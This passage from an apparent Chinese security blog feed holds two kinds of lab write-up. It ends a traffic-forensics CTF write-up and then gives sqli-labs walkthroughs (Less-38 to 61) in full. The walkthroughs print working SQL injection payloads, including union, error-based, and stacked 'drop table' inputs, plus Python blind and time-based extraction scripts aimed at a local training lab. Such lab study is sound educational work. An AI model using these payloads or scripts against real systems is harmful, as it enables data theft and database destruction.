alt="PjBV5F.md.png"></a><br>这题明显密码经过MD5加密的，所以这题得去somd5上解密<br>这题的答案是<code>edc123!@#</code></p><h4 id="9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip"><a href="#9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip" class="headerlink" title="9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip"></a>9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</h4><p>在webone的那个包里面直接搜索就可以得到<br><code>http contains &quot;eth&quot;</code><br><a href="https://imgchr.com/i/PjBm8J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBm8J.md.png" alt="PjBm8J.md.png"></a><br>或者你也可以直接从webtwo的包里面直接看到内网ip，这也对应了题目后面内网渗透之后，用vpn连接的过程<br>也就是从<code>192.168.32.189(内网地址)-&gt;10.3.3.100(连接vpn后重新分配的内网地址)</code><br>所以这题的答案就是<code>10.3.3.100</code></p><h4 id="10、黑客使用了什么账号登陆了mail系统（形式-username-password）"><a href="#10、黑客使用了什么账号登陆了mail系统（形式-username-password）" class="headerlink" title="10、黑客使用了什么账号登陆了mail系统（形式: username/password）"></a>10、黑客使用了什么账号登陆了mail系统（形式: username/password）</h4><p>既然说是mail系统那我们就在mail的两个包里面寻求答案，在mailtwo里面输入<code>http.request.method == &quot;POST&quot; and http contains &quot;password&quot;</code><br>出现很多相同username不同密码的请求，很有可能是在爆破mail系统，在mailtwo1这一个包里面同样的过滤还存在几条成立请求，对比一下时间，这应该是mailtwo还没爆破完mailtwo1这个包继续爆破，在mailtwo包里面的序号28的信息里面对应下面的几条response，发现一名叫wenwenni的人应该是登录成功的，经过了一个check的过程，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> loginCheck = <span class="function"><span class="keyword">function</span>(<span class="params">form</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(form.username.value == <span class="string">""</span>) &#123;</span><br><span class="line">           alert(<span class="string">"..........................."</span>);</span><br><span class="line">           form.username.focus();</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(form.password.value == <span class="string">""</span>) &#123;</span><br><span class="line">           alert(<span class="string">"..........................."</span>);</span><br><span class="line">           form.password.focus();</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">var</span> key_hash = CryptoJS.MD5(<span class="string">'1234567812345678'</span>);</span><br><span class="line"><span class="keyword">var</span> key = CryptoJS.enc.Utf8.pars</span><br></pre></td></tr></table></figure><p>然后回显下面的信息<br><img src="https://s1.ax1x.com/2018/08/30/PjBQDx.png" alt="PjBQDx.png"><br>所以感觉应该有这样的重点字在里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;&#123;\&quot;success\&quot;:true&#125;&quot; and ip.addr==192.168.94.59</span><br></pre></td></tr></table></figure><p>于是乎过滤，但是第一个包里面太多了，这一题其实我也不怎么确定，为什么与这么多success的还得继续爆破下去？希望有大佬能讲一讲。。。。<br>之鞥按照常规套路，把在mailtwo1包里面的筛出来的最后一个标记一下，再过滤回http，再来<code>ctrl+shift+N</code>跳到标记处，然后往回找有关登录的请求，找到的第一个请求。。。<br><a href="https://imgchr.com/i/PjBlb6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBlb6.md.png" alt="PjBlb6.md.png"></a></p><p>那个密码需要AES解密，利用上面的算法求出key大概是。。。个人感觉这题最有难度<br><a href="http://encode.chahuo.com/" target="_blank" rel="noopener">http://encode.chahuo.com/</a></p><p>解密出来的结果跟第三题的答案一样。。。。。后来看到有人说这是社工手段，直接套第三题答案，有意思有意思。。。。</p><h4 id="11、黑客获得的vpn-ip是多少"><a href="#11、黑客获得的vpn-ip是多少" class="headerlink" title="11、黑客获得的vpn,ip是多少"></a>11、黑客获得的vpn,ip是多少</h4><p>最后一题在vpntwo这个包里面直接点击统计-&gt;端点，又学到了一种方法<br>看到发包最多的是<code>10.3.4.3</code><br><a href="https://imgchr.com/i/PjB8UO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjB8UO.md.png" alt="PjB8UO.md.png"></a><br>所以这个答案就是<code>10.3.4.3</code></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>感觉流量分析还是有点套路的，第一点就是多用点contains语句，模糊匹配一下，关键字靠自己的灵活性以及分析过程得出的结论，个人感觉大部分题目会给出，比如的话有小马上传的时候，你会想到会存在关键字，比如eval,assert之类的东西吗，别人用拼接方式传的马那就另当别论了。。但是还是可以通过菜刀的一些标志来识别的，例如&gt;||&lt;之类符号，2333<br>第二就是各种自动化扫描器的指纹特征，还是得记一下，有点用，第三就是可以通过统计去发现某些ip的发包次数，从而确定可疑ip</p>]]></content>
      
      <categories>
          
          <category> 流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs实战记录(四)</title>
      <link href="/2018/08/29/sqli-labs-training-4/"/>
      <url>/2018/08/29/sqli-labs-training-4/</url>
      <content type="html"><![CDATA[<h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><p>从这一关开始就开始限制次数，而且数据库也换成了challenge，表名是随机的，<a id="more"></a>超过次数就会重新安排<br>代码审计发现是简单的单引号闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;XG5G593V9H&apos;%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,secret_0IMA,3 from XG5G593V9H where id=1%23</span><br></pre></td></tr></table></figure><p>提交获得的信息重置刷新次数</p><h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><p>这次变成了14次<br>先构造测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=1) %23</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;8753JZ68TI&apos; %23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,secret_UL8C,3 from 8753JZ68TI %23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><p>构造一下<br><code>http://192.168.100.105/sqlilabs/Less-56/?id=1&quot; %23</code>回显成功后来一直拿他试结果失败了<br>看了源代码才知道原来是括号+单引号的闭合<br>找了一下原因</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM security.users WHERE id=(&apos;1&quot;#&apos;) LIMIT 0,1</span><br></pre></td></tr></table></figure><p>在数据库中执行确实能够查到数据，那么问题在哪呢？</p><p>查找资料后发现，mysql在运算过程中能够自动的把数字转化为字符串，而在比较运算中，如果是数字和字符串比较，则可以自动的把字符串转为数字，转换的时候如果首字符字符是数字，则会转换为相应的数字，例如<code>‘1”#’</code>转化为数字值为<code>1</code>，如果是<code>‘11fads’</code>则为<code>11</code>，不过必须是数字和字符串比较的时候才会转换，如果都是字符的话则不会这样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) %23</span><br></pre></td></tr></table></figure><p>这样才对<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;HVL992XP27&apos;%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,secret_E2BQ,3 from HVL992XP27%23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><p>尝试一下闭合<br><code>http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,2,3 %23</code>发现这个有回显，常规套路<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;YRA6E572GR&apos; %23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,secret_LA1G,3 from YRA6E572GR %23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h3><p>这一关变成了5次<br>但是一侧就测试出来是单引号的闭合<br>执行以后发现不可以用union注入。。。因为不返回任何有数据库里面的信息<br>这段代码对其进行了处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">$pass = array_reverse($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br></pre></td></tr></table></figure><p>下面有报错我们可以利用报错注入<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;XXQT0FJQL2&apos;),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select secret_LVSS from XXQT0FJQL2),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3><p>同样的报错注入，只需要加个注释，什么单引号双引号闭合都没有<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;CA4PGB5VU5&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select secret_O5UY from CA4PGB5VU5),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h3><p>这一次是<code>双引号+括号</code>的闭合<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;ZIYD79H66Q&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select secret_JIPP from ZIYD79H66Q),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>此题完结</p><h3 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h3><p>这次是单引号+两个括号的闭合，也是够变态的<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;0NCH5HWI5Q&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select secret_6IKU from 0NCH5HWI5Q),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>完结</p><h3 id="Less-62-Less65"><a href="#Less-62-Less65" class="headerlink" title="Less-62-Less65"></a>Less-62-Less65</h3><p>都是一样的都需要盲注，但是给的次数太少，很难跑出来，等我算法学得好一点再去把脚本写出来吧</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>终于把这个SQL注入的平台的题目给做完了，最近感冒难受的一批。。。撒花~~~</p>]]></content>
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs实战记录(三)</title>
      <link href="/2018/08/29/sqli-labs-training-3/"/>
      <url>/2018/08/29/sqli-labs-training-3/</url>
      <content type="html"><![CDATA[<h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>从这一关开始其实就是堆叠注入，就是用分号连接两个不同的语句，然后执行这几条语句，进行增删改查，<a id="more"></a>但是比赛中是不大会用的，但是对于这几个环境我还是偏向union注入所以我还是以union注入的方式显示</p><p>换了mysqli的连接方式，但是换汤不换药<br>直接单引号闭合就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-38/?id=-1&apos; union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>报错尝试一下 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-38/?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><p>这个题直接注释掉后面的部分就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-39/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><p>普通的union注入就可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-40/?id=1234&apos;) union select 1,2,3%23</span><br></pre></td></tr></table></figure><p>也可以尝试一下盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-40/?id=1&apos;) and ascii(substr(database(),1,1))&gt;114 %23</span><br></pre></td></tr></table></figure><h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><p>union注入也可以，盲注也可以<br>union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-41/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-41/?id=1 and ascii(substr(database(),1,1))&gt;114 %23</span><br></pre></td></tr></table></figure><h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><p>这个题目查看源码你会发现登陆页面的password是没有过滤好的，我么可以利用此处进行堆叠注入增加，我们可以利用这点直接删库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123;drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><p>跟上一题一样password没有过滤<br>只是查询的语句改变了，我么需要闭合括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123&apos;);drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><p>跟上一题同样的思路，只是需要单引号闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123&apos;;drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><p>感觉跟43题没啥区别啊。。。</p><h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><p>从这一关开始正式进入order by注入<br>查看一下源码语句是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY $id"</span>;</span><br></pre></td></tr></table></figure><p>order by利用的三种方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、直接添加注入语句 ?sort=(select ******)</span><br><span class="line">2、利用一些函数，例如rand函数，?sort=rand(sql语句)，而且此处rand(true)和rand(false)是不相同的。</span><br><span class="line">3、利用and，例如?sort=1 and (加sql语句)</span><br></pre></td></tr></table></figure><p>这一题目可以直借用报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-46/?sort=rand(updatexml(1,concat(0x7e,database(),0x7e),1))</span><br></pre></td></tr></table></figure><p>也可以用盲注，利用表格最后一行去区分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.105/sqlilabs/Less-46/?sort=rand(ascii(substr((select database()),&#123;_&#125;,1))&gt;&#123;__&#125;)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Min+Max)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'&lt;td&gt;superman&lt;/td&gt;&lt;td&gt;genious&lt;/td&gt;&lt;/tr&gt;&lt;/font&gt;&lt;/table&gt;'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><p>这一次的order by注入需要闭合单引号<br>来个报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-47/?sort=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><p>跟46题一样的盲注。</p><h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><p>一直在尝试下面这两句话，发现一直没效果，奇了怪，自我感觉没问题。。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-49/?sort=1&apos; and rand(ascii(substr((select database()),1,1))&gt;127)%23</span><br><span class="line">http://localhost/sql/Less-49/?sort=1&apos; and ascii(substr((select database()),1,1))&gt;1%23</span><br></pre></td></tr></table></figure><p>再来尝试一下时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.105/sqlilabs/Less-49/?sort=1' and if(((ascii(substr((select password from users where username="admin"),&#123;_&#125;,1)))=&#123;__&#125;),sleep(4),false) --+'''</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">67</span>,<span class="number">127</span>):</span><br><span class="line">        payload = url.format(_=i,__=j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(payload,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>直接出来结果，这尼玛什么操作。。</p><h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><p>这可以直接报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-50?sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure><h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><p>单引号闭合报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-51?sort=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><p>同样直接盲注或者时间盲注都行，不需要单引号闭合没什么意义</p><h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><p>又是一道单引号闭合的题目，直接时间盲注就可以出来参考Less-49的脚本</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这一部分的题目让我了解到怎么对付order by注入，很有意义，个人最喜欢还是用rand函数的那种办法<br>但前面的堆叠注入就感觉意义不大。。。。</p>]]></content>
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs实战记录(二)</title>
      <link href="/2018/08/29/sqli-labs-training-2/"/>
      <url>/2018/08/29/sqli-labs-training-2/</url>
